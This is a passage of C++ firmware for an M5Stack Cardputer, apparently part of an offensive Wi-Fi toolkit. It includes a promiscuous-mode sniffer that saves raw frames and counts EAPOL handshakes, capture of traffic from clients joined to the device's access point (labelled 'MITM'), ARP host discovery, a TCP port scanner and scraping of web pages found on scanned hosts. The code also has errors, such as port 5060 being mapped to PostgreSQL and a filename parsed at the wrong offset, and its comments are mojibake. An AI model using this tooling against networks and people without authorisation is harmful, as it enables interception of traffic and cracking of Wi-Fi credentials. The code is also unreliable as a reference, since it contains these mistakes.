      frameSubType == 0x0D || frameSubType == 0x0B || frameSubType == 0x0C) {
    sig_len -= 4;
  }

  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();  

  // VÃ©rification si c'est une trame EAPOL
  if (estUnPaquetEAPOL(packet)) {
    eapolCount++;
    Serial.printf("EAPOL packet recorded. Number of EAPOL: %d\n", eapolCount);
  } else if (frameType == 0) { // VÃ©rification si c'est une trame de Management
    switch (frameSubType) {
      case 0x08: // Beacon
        beaconCount++;
        Serial.printf("Beacon packet recorded. Number of Beacons: %d\n", beaconCount);
        break;
      case 0x04: // Probe Request
        probeReqCount++;
        Serial.printf("Probe Request packet recorded. Number of Probe Requests: %d\n", probeReqCount);
        break;
      case 0x05: // Probe Response
        probeRespCount++;
        Serial.printf("Probe Response packet recorded. Number of Probe Responses: %d\n", probeRespCount);
        break;
      case 0x0C: // Deauthentication
        deauthCountSniff++;
        Serial.printf("Deauthentication packet recorded. Number of Deauthentications: %d\n", deauthCountSniff);
        break;
      default:
        Serial.println(F("Unrecognized Management packet type recorded."));
        break;
    }
  } else {
    Serial.println(F("Non-EAPOL, non-Management packet recorded."));
  }

  packetSavedCount++; 
  Serial.printf("Packet recorded. Total number of packets saved: %d\n", packetSavedCount);
}


void allTrafficCallback_snifferAll(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_snifferAll(pkt);
}

void findNextAvailableFileID() {
  Serial.println(F("Searching for the next available file ID..."));
  allSniffCount = 0; 
  File root = SD.open("/evil/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("RawSniff_")) {
        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}

void allTrafficSniffer() {
  // Reset counters
  beaconCount = 0;
  eapolCount = 0;
  probeReqCount = 0;
  probeRespCount = 0;
  deauthCountSniff = 0;
  packetSavedCount = 0;

  Serial.println(F("Resetting packet counters..."));
  enterDebounce();
  // Check available file ID on SD card
  if (!SD.exists("/evil/sniffer") && !SD.mkdir("/evil/sniffer")) {
    Serial.println(F("Unable to create /sniffer directory"));
    return;
  }
  findNextAvailableFileID();

  // Create a filename for the next capture
  char filename[50];
  sprintf(filename, "/evil/sniffer/RawSniff_%02X.pcap", allSniffCount);

  // Open the file for writing
  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println(F("Failed to open capture file for writing"));
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  // Set up WiFi in promiscuous mode
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(allTrafficCallback_snifferAll);

  Serial.println(F("Starting all traffic sniffer..."));
  M5.Lcd.clear();
  M5.Lcd.setTextColor(menuTextFocusedColor);
  M5.Lcd.setCursor(3, 0);
  M5.Lcd.println("Sniffing Raw on :");
  M5.Lcd.println(filename);

  bool exitSniff = false;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 300;
  unsigned long lastCursorBlinkTime = 0;
  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5Cardputer.update();
    handleDnsRequestSerial();
    unsigned long currentPressTime = millis();
    unsigned long currentTime = millis();

    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Lcd.setCursor(0, 25);
    M5.Lcd.printf("     < [Channel]: %d > \n", currentChannel);
    M5.Lcd.setCursor(0, 42);
    M5.Lcd.printf("[Beacon]      : %d\n", beaconCount);
    M5.Lcd.printf("[EAPOL]       : %d\n", eapolCount);
    M5.Lcd.printf("[Deauth]      : %d\n", deauthCountSniff);
    M5.Lcd.printf("[ProbeReq]    : %d\n", probeReqCount);
    M5.Lcd.printf("[ProbeResp]   : %d\n", probeRespCount);
    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
    M5.Lcd.setCursor(0, M5.Display.height() - 16);

    // Cursor blinking every second
    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Lcd.printf(cursorVisible ? ">_" : "> ");

    // Show pause indicator
    if (isPaused) {
      M5.Lcd.setCursor(M5.Lcd.width() - 70, M5.Lcd.height() - 12);
      M5.Lcd.setTextColor(WHITE, RED);
      M5.Lcd.print(" PAUSE ");
    } else{
      M5.Lcd.setCursor(M5.Lcd.width() - 80, M5.Lcd.height() - 12);
      M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
      M5.Lcd.print("        ");
    }

    // Channel change detection
    if (M5Cardputer.Keyboard.isKeyPressed(',') && currentPressTime - lastKeyPressTime > debounceDelay) {
      lastKeyPressTime = currentPressTime;
      currentChannel = (currentChannel > 1) ? currentChannel - 1 : 14;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Channel decreased, now on: %d\n", currentChannel);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('/') && currentPressTime - lastKeyPressTime > debounceDelay) {
      lastKeyPressTime = currentPressTime;
      currentChannel = (currentChannel < 14) ? currentChannel + 1 : 1;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      Serial.printf("Channel increased, now on: %d\n", currentChannel);
    }

    // Pause sniffer detection
    if (M5Cardputer.Keyboard.isKeyPressed('p') && currentPressTime - lastKeyPressTime > debounceDelay) {
      lastKeyPressTime = currentPressTime;
      isPaused = !isPaused;
      Serial.printf("Sniffer %s.\n", isPaused ? "paused" : "resumed");
    }

    // Exit key detection
    if ((M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) && currentPressTime - lastKeyPressTime > debounceDelay) {
      exitSniff = true;
      lastKeyPressTime = currentPressTime;
      Serial.println(F("Exit key detected, stopping sniffer..."));
    }
  }

  // Clean up WiFi promiscuous mode
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  // Close the file
  sniffFile.close();
  Serial.println(F("Stopped all traffic sniffer, file closed."));
  waitAndReturnToMenu("Stopping Sniffing...");
}




void recordPacketToPCAPFile_MITM(const wifi_promiscuous_pkt_t* packet) {
  if (!sniffFile || isPaused) {
    Serial.println(F("Capture file not open or sniffing is paused, packet not recorded."));
    return;
  }

  uint16_t sig_len = packet->rx_ctrl.sig_len;
  const uint8_t *frame = packet->payload;

  uint16_t frameControl = (frame[1] << 8) | frame[0];
  uint8_t frameType = (frameControl & 0x0C) >> 2;
  uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  bool toDS = frameControl & (1 << 8);
  bool fromDS = frameControl & (1 << 9);

  if (frameType != 0x02) {
    return;
  }

  if (frameSubType == 0x4 || frameSubType == 0xC) {
    size_t header_length = 24;
    if (frameSubType & 0x08) {
      header_length += 2;
    }
    if (frameControl & 0x8000) {
      header_length += 4;
    }
    size_t total_header_length = header_length + 4;

    if (sig_len <= total_header_length) {
      return;
    }
  }

  uint8_t da[6];
  if (toDS && fromDS) {
    memcpy(da, frame + 24, 6);
  } else if (toDS && !fromDS) {
    memcpy(da, frame + 16, 6);
  } else {
    memcpy(da, frame + 4, 6);
  }

  bool isIPv4Multicast = (da[0] == 0x01) && (da[1] == 0x00) && (da[2] == 0x5e) && ((da[3] & 0x80) == 0x00);
  bool isIPv6Multicast = (da[0] == 0x33) && (da[1] == 0x33);

  if (isIPv4Multicast || isIPv6Multicast) {
    return;
  }

  Serial.println(F("Recording a packet to the PCAP file..."));

  snifferAll_pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = sig_len;
  pcap_packet_header.orig_len = sig_len;

  sniffFile.write((const uint8_t*)&pcap_packet_header, sizeof(snifferAll_pcaprec_hdr_t));
  sniffFile.write(packet->payload, sig_len);
  sniffFile.flush();

  packetSavedCount++;
}

void findNextAvailableFileIDClient() {
  Serial.println(F("Searching for the next available file ID..."));
  allSniffCount = 0; 
  File root = SD.open("/evil/sniffer");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String filename = file.name();
      if (filename.startsWith("ClientSniff_")) {
        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}
void TrafficMITMCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_MITM(pkt);
}

void sniffNetwork() {
  if (getConnectedPeopleCount() == 0) {
    waitAndReturnToMenu("No client connected..");
    return;
  }
  Serial.println(F("Resetting packet counters..."));
  packetSavedCount = 0;
  enterDebounce();
  if (!SD.exists("/evil/sniffer") && !SD.mkdir("/evil/sniffer")) {
    Serial.println(F("Unable to create /sniffer directory"));
    return;
  }
  findNextAvailableFileIDClient();

  char filename[50];
  sprintf(filename, "/evil/sniffer/ClientSniff_%02X.pcap", allSniffCount);

  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println(F("Failed to open capture file for writing"));
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(TrafficMITMCallback);

  Serial.println(F("Starting all traffic sniffer..."));
  M5.Lcd.clear();
  M5.Lcd.setTextColor(menuTextFocusedColor);
  M5.Lcd.setCursor(3, 0);
  M5.Lcd.println("Sniffing Raw on :");
  M5.Lcd.println(filename);

  bool exitSniff = false;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 300;
  unsigned long lastCursorBlinkTime = 0;

  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5Cardputer.update();
    handleDnsRequestSerial();
    
    if (getConnectedPeopleCount() == 0) {
      Serial.println(F("No stations connected, stopping sniffer and returning to menu..."));
      M5.Lcd.clear();
      M5.Lcd.setTextColor(RED);
      int centerX = 240 / 2 - (10 * strlen("No clients connected")) / 2;
      int centerY = 135 / 2 - 8;
      M5.Lcd.setCursor(centerX, centerY);
      M5.Lcd.println("No more clients...");
      vTaskDelay(pdMS_TO_TICKS(2000));
      exitSniff = true;
      continue;
    }

    unsigned long currentPressTime = millis();
    unsigned long currentTime = millis();

    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Lcd.setCursor(0, 25);
    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
    M5.Lcd.setCursor(0, M5.Display.height() - 16);

    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Lcd.printf(cursorVisible ? ">_" : "> ");

    if ((M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE))) {
      exitSniff = true;
      lastKeyPressTime = currentPressTime;
      Serial.println(F("Exit key detected, stopping sniffer..."));
    }
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  sniffFile.close();
  Serial.println(F("Stopped all traffic sniffer, file closed."));
  waitAndReturnToMenu("Stopping Sniffing...");
}


#include <lwip/sockets.h>

// Global variables
File scanFile;
String scanFolder = "/evil/NetworkScan";

// Function to get the next file index
int getNextFileIndex() {
    if (!SD.exists(scanFolder)) {
        SD.mkdir(scanFolder);  // Create the folder if it doesn't exist
    }

    File root = SD.open(scanFolder);
    int maxIndex = -1;
    while (File file = root.openNextFile()) {
        String fileName = file.name();
        if (fileName.endsWith(".txt")) {
            // Extract the index number from the file name
            int currentIndex = fileName.substring(fileName.lastIndexOf('/') + 1, fileName.lastIndexOf('.')).toInt();
            if (currentIndex > maxIndex) {
                maxIndex = currentIndex;
            }
        }
        file.close();
    }
    root.close();
    return maxIndex + 1;  // Return the next file index
}

// Function to log scan results to the file progressively
void logScanResult(String result) {
    if (!scanFile) {
        int fileIndex = getNextFileIndex();
        String filePath = scanFolder + "/" + String(fileIndex) + ".txt";  // Create a new file path with the next index
        scanFile = SD.open(filePath, FILE_WRITE);  // Open the file for writing
        if (!scanFile) {
            M5.Display.println("Failed to create scan file.");
            return;
        }
    }
    scanFile.println(result);  // Write the scan result to the file
    scanFile.flush();  // Ensure the data is written to the file
}


// Mise Ã  jour de la fonction FullNetworkAnalysis pour passer l'index du scan
void FullNetworkAnalysis(bool isWebCommand) {
    // Check WiFi connection
    if (WiFi.localIP().toString() == "0.0.0.0") {
        scanInProgress = false;
        waitAndReturnToMenu("Not connected...");
        return;
    }

    enterDebounce();

    IPAddress gatewayIP;
    IPAddress subnetMask;
    std::vector<IPAddress> hostslist;

    // Initial display configuration
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setTextSize(1.5);

    gatewayIP = WiFi.gatewayIP();
    subnetMask = WiFi.subnetMask();

    IPAddress network = WiFi.localIP();
    network[3] = 0;  // Use the base network address
    M5.Display.clear();
    int numHosts = 254 - subnetMask[3];  // Calculate the number of hosts
    M5.Display.setCursor(5, M5.Display.height() / 2);
    M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
    M5.Display.println("       please wait...");

    bool foundHosts = false;

    // Prepare the base IP address for ARP requests
    char base_ip[16];
    sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

    // Send ARP requests across the network
    send_arp(base_ip, hostslist);

    // Read the ARP table to detect active hosts
    read_arp_table(base_ip, 1, numHosts, hostslist);

    // Scan through the ARP table and log results
    for (int i = 1; i <= numHosts; i++) {
        IPAddress currentIP = network;
        currentIP[3] = i;

        if (arpRequest(currentIP)) {
            hostslist.push_back(currentIP);
            foundHosts = true;
            logScanResult("Host : " + currentIP.toString());  // Log each found host
        }
    }

    if (!foundHosts) {
        M5.Display.println("No hosts found.");
        delay(2000);
        scanInProgress = false;
        waitAndReturnToMenu("No hosts found.");
        return;
    } else {
        logScanResult("-----------------------");
    }

    // Display the number of found hosts
    M5.Display.clear();
    M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() / 2);
    M5.Display.println(String(hostslist.size()) + " hosts found");
    delay(2000);

    // Scrolling display of the hosts and scanning their ports
    int scanIndex = getNextFileIndex();
    displayHostsAndScanPorts(hostslist, scanIndex, isWebCommand);

    // Close the scan file after the scan is done
    if (scanFile) {
        scanFile.close();
        M5.Display.println("Scan results saved successfully.");
    }
}

bool connectWithTimeout(WiFiClient& client, IPAddress ip, uint16_t port, uint32_t timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = ip;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    int res = connect(sock, (struct sockaddr*)&server, sizeof(server));
    if (res < 0) {
        if (errno != EINPROGRESS) {
            close(sock);
            return false;
        }
    }

    fd_set fdset;
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    res = select(sock + 1, NULL, &fdset, NULL, &tv);
    if (res <= 0) {
        close(sock);
        return false;
    }

    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return false;
    }

    client = WiFiClient(sock);
    return true;
}

// Fonction pour afficher les hÃ´tes et analyser les ports
void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanIndex, bool isWebCommand) {
    int displayStart = 0;
    int lineHeight = 12;
    int maxLines = M5.Display.height() / lineHeight;
    std::vector<String> scanResults;
    std::map<IPAddress, std::vector<int>> openPorts;

    const int ports[] = {
        /* classiques */
        20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 123, 135, 137, 139, 143,
        161, 162, 389, 443, 445, 465, 514, 554, 587, 631, 636, 873, 993, 995,
        1024, 1025, 1352, 1433, 1521, 1720, 1723, 2049, 2181, 2222,
        2375, 2376, 3306, 3389, 3690, 5000,
    
        /*  â€•â€•â€•â€•â€•â€•  SIP / VoIP  â€•â€•â€•â€•â€•â€•  */
        5060,                 // SIP UDP/TCP
        5061,                 // SIPS (TLS)
        5062,                 // SIP (alt vendor)
        5080, 5081,           // SIP / SIPS (FreeSWITCH/OpenSIPS)
        5160,                 // FreePBX / PJSIP par dÃ©faut
        6060, 6061,           // divers tÃ©lÃ©phones / SBC
        /* ------------------------------------------------------------- */
    
        5060, 5432, 5555, 5900, 5985, 5986, 6379,
        8080, 8443, 9000, 9100, 9200, 9999, 10000,
        11211, 1194, 27017, 32768, 49152, 49153,
        49154, 49155, 49156, 49157
    };

    const int numPorts = sizeof(ports) / sizeof(ports[0]);
    const int timeout_ms = 75;

    std::map<int, String> portServices = {
        /* classiques */
        {20,"FTP Data"}, {21,"FTP"}, {22,"SSH"}, {23,"Telnet"}, {25,"SMTP"},
        {53,"DNS"}, {67,"DHCP"}, {68,"DHCP"}, {69,"TFTP"}, {80,"HTTP"},
        {110,"POP3"}, {123,"NTP"}, {135,"MS-RPC"}, {137,"NetBIOS"},
        {139,"NetBIOS"}, {143,"IMAP"}, {161,"SNMP"}, {162,"SNMP Trap"},
        {389,"LDAP"}, {443,"HTTPS"}, {445,"SMB"}, {465,"SMTPS"},
        {514,"Syslog"}, {554,"RTSP"}, {587,"SMTP-SUB"}, {631,"IPP"},
        {636,"LDAPS"}, {873,"rsync"}, {993,"IMAPS"}, {995,"POP3S"},
        {1024,"Reserved"}, {1025,"NFS/IIS"}, {1352,"LotusNotes"},
        {1433,"MSSQL"}, {1521,"Oracle"}, {1720,"H.323"}, {1723,"PPTP"},
        {2049,"NFS"}, {2181,"Zookeeper"}, {2222,"SSH Alt"},
        {2375,"Docker"}, {2376,"DockerTLS"}, {3306,"MySQL"},
        {3389,"RDP"}, {3690,"SVN"}, {5000,"UPnP/WS"},
        
        /*  â€•â€•â€•â€•â€•â€•  SIP / VoIP  â€•â€•â€•â€•â€•â€•  */
        {5060,"SIP"},          // UDP/TCP
        {5061,"SIPS (TLS)"},
        {5062,"SIP Alt"},
        {5080,"SIP Alt"},
        {5081,"SIPS Alt"},
        {5160,"SIP (PJSIP)"},
        {6060,"SIP Alt"},
        {6061,"SIPS Alt"},
        /* ------------------------------------------------------------- */
    
        {5060,"PostgreSQL"}, {5555,"ADB"}, {5900,"VNC"},
        {5985,"WinRM HTTP"}, {5986,"WinRM HTTPS"}, {6379,"Redis"},
        {8080,"HTTP Proxy"}, {8443,"HTTPS Alt"}, {9000,"SonarQube"},
        {9100,"PJL/JetDirect"}, {9200,"Elastic"}, {9999,"Urchin"},
        {10000,"Webmin"}, {11211,"Memcached"}, {1194,"OpenVPN"},
        {27017,"MongoDB"}, {32768,"RPC"}, {49152,"WinRPC"},
        {49153,"WinRPC"}, {49154,"WinRPC"}, {49155,"WinRPC"},
        {49156,"WinRPC"}, {49157,"WinRPC"}
    };



    int currentHostIndex = 0;
    M5.Display.setTextSize(1.5);
    bool needsDisplayUpdate = true;

    while (currentHostIndex < hostslist.size()) {
        IPAddress host = hostslist[currentHostIndex];
        String hostHeader = "Host: " + host.toString();
        scanResults.push_back("--------------------------");
        scanResults.push_back(hostHeader);
        scanResults.push_back("--------------------------");
        needsDisplayUpdate = true;

        if (needsDisplayUpdate) {
            displayResults(displayStart, maxLines, scanResults);
            needsDisplayUpdate = false;
        }

        for (int j = 0; j < numPorts; j++) {
            int port = ports[j];
            WiFiClient client;
            bool isPortOpen = connectWithTimeout(client, host, port, timeout_ms);

            if (isPortOpen) {
                String service = portServices.count(port) ? portServices[port] : "Unknown";
                scanResults.push_back("Port " + String(port) + " open - " + service);
                client.stop();
                needsDisplayUpdate = true;
                logScanResult(host.toString() + " - " + String(port) + " - " + service);  // Enregistrer les informations de port
                openPorts[host].push_back(port);
            }

            if (needsDisplayUpdate) {
                displayResults(displayStart, maxLines, scanResults);
                needsDisplayUpdate = false;
            }

            M5Cardputer.update();
            if (handleScrolling(displayStart, maxLines, scanResults.size())) {
                needsDisplayUpdate = true;
            }
            delay(10);
        }

        scanResults.push_back("--------------------------");
        logScanResult("--------------------------");  // Enregistrer les informations de port
        scanResults.push_back(host.toString() + " Finished.");
        needsDisplayUpdate = true;

        if (needsDisplayUpdate) {
            displayResults(displayStart, maxLines, scanResults);
            needsDisplayUpdate = false;
        }

        M5Cardputer.update();
        if (handleScrolling(displayStart, maxLines, scanResults.size())) {
            needsDisplayUpdate = true;
        }

        currentHostIndex++;
    }
    scanResults.push_back("--------------------------");
    scanResults.push_back("Scan Terminated.");
    displayResults(displayStart, maxLines, scanResults);
    if (!isWebCommand){
      while (true) {
          M5Cardputer.update();
          if (handleScrolling(displayStart, maxLines, scanResults.size())) {
              needsDisplayUpdate = true;
          }
          if (needsDisplayUpdate) {
              displayResults(displayStart, maxLines, scanResults);
              needsDisplayUpdate = false;
          }
          if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
              break;
          }
          delay(30);
      }
      if (confirmPopup("Scrape websites? (Y/N)")) {
          M5.Display.clear();
          fetchWebsites(hostslist, openPorts, scanIndex);  // Appelle la fonction pour rÃ©cupÃ©rer les sites
      }
    }
    scanInProgress = false;
    waitAndReturnToMenu("Return to menu.");
}


// Function to display scan results
void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults) {
    M5.Display.clear();
    M5.Display.setCursor(5, 5);

    int totalLines = scanResults.size();
    int endLine = min(displayStart + maxLines, totalLines);

    for (int i = displayStart; i < endLine; i++) {
        M5.Display.println(scanResults[i]);
    }
}

// Function to handle scrolling
bool handleScrolling(int& displayStart, int maxLines, int totalLines) {
    int previousDisplayStart = displayStart;
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        displayStart = max(0, displayStart - 1);
        delay(30);
    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        displayStart = min(displayStart + 1, max(0, totalLines - maxLines));
        delay(30);
    }
    return displayStart != previousDisplayStart;
}


void fetchWebsites(const std::vector<IPAddress>& hostslist, const std::map<IPAddress, std::vector<int>>& openPorts, int scanIndex) {
    // CrÃ©er un dossier spÃ©cifique pour ce scan
    String folderPath = "/evil/Captured_Website/Scan_" + String(scanIndex);
    if (!SD.exists(folderPath)) {
        SD.mkdir(folderPath);
    }

    int totalWebsites = 0;
    for (const auto& [host, ports] : openPorts) {
        for (int port : ports) {
            if (port == 443 || port == 8443 || port == 80 || port == 8080 || port == 8000 || isLikelyWebPort(port)) {
                totalWebsites++;
            }
        }
    }

    int processedWebsites = 0;

    for (const auto& [host, ports] : openPorts) {
        for (int port : ports) {
            String protocol;
            if (port == 443 || port == 8443) {
                protocol = "https://";
            } else if (port == 80 || port == 8080 || port == 8000) {
                protocol = "http://";
            } else if (isLikelyWebPort(port)) {
                // Tenter HTTP d'abord pour les autres ports communs
                protocol = "http://";
            } else {
                // Ignorer les ports qui ne sont pas liÃ©s aux services web
                continue;
            }

            processedWebsites++;

            // Afficher le dÃ©compte centrÃ© en x et Ã  la ligne y = 40
            String countDisplay = String(processedWebsites) + "/" + String(totalWebsites);
            M5.Display.setCursor(110, 20);
            M5.Display.print(countDisplay); 
            M5.Display.display();

            String url = protocol + host.toString() + ":" + String(port);

            // Effectuer une requÃªte HTTP GET et suivre les redirections
            String content = getHttpContentWithRedirect(url);

            // Enregistrer le contenu dans un fichier
            if (!content.isEmpty()) {
                saveWebsiteContent(folderPath, host.toString() + "_" + String(port), content);
            }
        }
    }
}

// Fonction pour identifier si le port est susceptible de servir un site web
bool isLikelyWebPort(int port) {
    // Liste des ports courants utilisÃ©s pour des services web
    std::vector<int> webPorts = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 7001};
    return std::find(webPorts.begin(), webPorts.end(), port) != webPorts.end();
}

// Fonction pour rÃ©cupÃ©rer le contenu HTML d'une page avec gestion des redirections
String getHttpContentWithRedirect(String url) {
    HTTPClient http;
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.begin(url);
    int httpCode = http.GET();
    String payload = "";

    if (httpCode == HTTP_CODE_OK) {
        payload = http.getString();
    }

    http.end();
    return payload;
}


// Fonction pour sauvegarder le contenu du site dans un fichier
void saveWebsiteContent(String folderPath, String identifier, String content) {
    String filePath = folderPath + "/" + identifier + ".html";  // CrÃ©e un fichier pour chaque site web
    File webFile = SD.open(filePath, FILE_WRITE);
    
    String statusMessage = "";
    if (webFile) {
        webFile.print(content);
        webFile.close();
        statusMessage = "Scraping :";
    } else {
        statusMessage = "Failed :";
    }

    // Effacer l'Ã©cran
    M5.Display.clear();

    // Calcul pour centrer le texte verticalement
    int textHeight = M5.Display.fontHeight() * 2;  // Estimation pour deux lignes de texte
    int startY = (M5.Display.height() - textHeight) / 2;

    // Calcul pour centrer la premiÃ¨re ligne
    int statusTextWidth = M5.Display.textWidth(statusMessage);
    int startXStatus = (M5.Display.width() - statusTextWidth) / 2;

    // Afficher la premiÃ¨re ligne centrÃ©e
    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(startXStatus, startY);
    M5.Display.println(statusMessage);

    // Calcul pour centrer la deuxiÃ¨me ligne
    int identifierTextWidth = M5.Display.textWidth(identifier);
    int startXIdentifier = (M5.Display.width() - identifierTextWidth) / 2;

    // Afficher la deuxiÃ¨me ligne centrÃ©e
    M5.Display.setCursor(startXIdentifier, startY + M5.Display.fontHeight());
    M5.Display.println(identifier);
}

// Fonction pour lister les fichiers texte dans un dossier
std::vector<String> listScanFiles() {
    std::vector<String> scanFiles;
    if (!SD.exists(scanFolder)) {
        SD.mkdir(scanFolder);  // CrÃ©er le dossier s'il n'existe pas
    }

    File root = SD.open(scanFolder);
    while (File file = root.openNextFile()) {
        String fileName = file.name();
        if (fileName.endsWith(".txt")) {
            scanFiles.push_back(fileName);  // Ajouter Ã  la liste des fichiers
        }
        file.close();
    }
    root.close();
    return scanFiles;  // Retourne la liste des fichiers trouvÃ©s
}

// Fonction pour afficher la liste dÃ©roulante des fichiers
void displayFileList(const std::vector<String>& files) {
    int displayStart = 0;
    int currentFileIndex = 0;
    int lineHeight = 12;
    int maxLines = M5.Display.height() / lineHeight;
    bool needsDisplayUpdate = true;
    enterDebounce();
    
    while (true) {
        if (needsDisplayUpdate) {
            M5.Display.clear(TFT_BLACK);
            int endLine = min(displayStart + maxLines, (int)files.size());
            for (int i = displayStart; i < endLine; i++) {
                if (i == currentFileIndex) {
                    M5.Display.fillRect(0, (i - displayStart) * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
                }
                M5.Display.setCursor(2, (i - displayStart) * lineHeight);
                M5.Display.println(files[i]);
            }
            M5.Display.display();
            needsDisplayUpdate = false;
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {  // Touche ; pour monter
            currentFileIndex = max(0, currentFileIndex - 1);
            if (currentFileIndex < displayStart) {
                displayStart = max(0, displayStart - 1);
            }
            needsDisplayUpdate = true;
            delay(100);
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {  // Touche . pour descendre
            currentFileIndex = min((int)files.size() - 1, currentFileIndex + 1);
            if (currentFileIndex >= displayStart + maxLines) {
                displayStart = min(displayStart + 1, (int)files.size() - maxLines);
            }
            needsDisplayUpdate = true;
            delay(100);
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {  // Touche EntrÃ©e pour sÃ©lectionner
            viewFileContent(String(scanFolder) + "/" + files[currentFileIndex]);  // Afficher le contenu du fichier sÃ©lectionnÃ© avec le chemin complet
            enterDebounce();
            needsDisplayUpdate = true; // RafraÃ®chir la liste des fichiers aprÃ¨s avoir visualisÃ© un fichier
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {  // Touche EntrÃ©e pour sÃ©lectionner
            break;
        }


        delay(30);
    }
}

// Fonction pour afficher le contenu d'un fichier sÃ©lectionnÃ©
void viewFileContent(String filePath) {
    File file = SD.open(filePath);
    if (!file) {
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.println("Failed to open file: " + filePath);
        M5.Display.display();
        delay(2000);
        return;
    }

    std::vector<String> fileLines;
    while (file.available()) {
